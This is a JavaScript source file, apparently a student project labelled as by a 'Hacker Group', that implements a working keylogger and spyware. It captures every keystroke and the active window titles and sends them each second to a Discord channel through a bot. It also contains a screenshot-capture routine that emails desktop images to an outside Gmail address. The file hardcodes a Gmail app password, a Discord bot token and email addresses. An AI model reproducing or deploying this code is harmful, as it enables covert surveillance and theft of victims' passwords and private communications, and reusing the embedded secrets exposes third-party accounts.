/*
  Developed By : BSCS 3B Hacker Group
  Members : Estadilla, Andrea Krystel T.
            Magistrado, Laurence O.
            Monte, Ylaiza Mae C.
  All rights reserved © 2023
*/

const { Client, GatewayIntentBits } = require('discord.js');
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages
  ]
});
var GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
var screenshot = require('screenshot-desktop');
var nodemailer = require('nodemailer');
const util = require('util');
const activeWin = require('active-win');
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const v = new GlobalKeyboardListener();

var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: '1t1sfordev@gmail.com',
    pass: 'iysz jtol plyq akbr'
  }
});

const token = 'MTE1NjUzMzI5OTQwMTk4NjA1OA.G3y_Dt.-vxNbKXulnd-Dz01HzUkdRMN7hVZmS8C3-pveE'; //discord bot token
const channelId = '1156535908280041542'; // Replace with your channel ID

let currentTitle = '';
let activeWindow = '';
let capturedOutput = '';
let capsLockOn = false;
let shiftPressed = false;

v.addListener(function (e) {
    if (e.state == "DOWN") {
        if (e.name == "CAPS LOCK") {
            capsLockOn = !capsLockOn;
        } else if (e.name == "LEFT SHIFT" || e.name == "RIGHT SHIFT") {
            shiftPressed = true;
			capturedOutput += " <DOWN SHIFT> ";
        } else if (e.state == "DOWN" && /^[a-zA-Z0-9]$/.test(e.name)) {
            if (capsLockOn || shiftPressed) {
                capturedOutput += e.name.toUpperCase();
            } else {
                capturedOutput += e.name.toLowerCase();
            }
        } else if (e.state == "DOWN" && e.name == "SPACE") {
            capturedOutput += " ";
        } else if (e.name == "DOT") {
            capturedOutput += ".";
        } else if (e.name == "LEFT ALT" || e.name == "RIGHT ALT") {
            capturedOutput += " <DOWN ALT> ";
        } else if (e.name == "LEFT CTRL" || e.name == "RIGHT CTRL") {
            capturedOutput += " <DOWN CTRL> ";
        } else {
            capturedOutput += `<${e.name}>`;
        }
    } else if (e.state == "UP" && (e.name == "LEFT ALT" || e.name == "RIGHT ALT")) {
        capturedOutput += " <UP ALT> ";
    } else if (e.state == "UP" && (e.name == "LEFT SHIFT" || e.name == "RIGHT SHIFT")) {
        shiftPressed = false;
        capturedOutput += " <UP SHIFT> ";
    } else if (e.state == "UP" && (e.name == "LEFT CTRL" || e.name == "RIGHT CTRL")) {
        capturedOutput += " <UP CTRL> ";
    }

    console.log(capturedOutput);
});


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
  
  setInterval(async () => {
    try {
      const result = await activeWin();
      const newTitle = result.title;
      
      if (newTitle !== currentTitle) {
        console.log('Active Window Title:', newTitle);
        currentTitle = newTitle;
        
        // Check if the active window has changed
        if (activeWindow !== newTitle) {
          activeWindow = newTitle;
          capturedOutput = ''; // Clear the capturedOutput when the active window changes
        }
        
        const logChannel = client.channels.cache.get(channelId);
        if (logChannel) {
          logChannel.send('ACTIVE WINDOW TITLE: ' + newTitle);
        }
      } else if (capturedOutput) {
        // If the active window title hasn't changed, but there's capturedOutput, send it.
        const logChannel = client.channels.cache.get(channelId);
        if (logChannel) {
          logChannel.send('KEYLOGS: ' + capturedOutput);
          capturedOutput = ''; // Clear the capturedOutput after sending
        }
      }
    } catch (error) {
      console.error(error);
    }
  }, 1000); // Check every second
});

async function captureAndSendScreenshot() {
  try {
    const img = await screenshot({ format: 'png' });

    // Send email with the screenshot as an attachment
    const info = await transporter.sendMail({
      from: '1t1sfordev@gmail.com',
      to: 'heroyii.chaw108@gmail.com',
      subject: 'Desktop Screenshot',
      text: 'Here is the desktop screenshot:',
      attachments: [
        {
          filename: 'screenshot.png',
          content: img,
        },
      ],
    });

    console.log('Screenshot sent: ', info.response);
  } catch (error) {
    console.error('Error:', error);
  }
}

//setInterval(captureAndSendScreenshot, 30000 * 4);
client.login(token);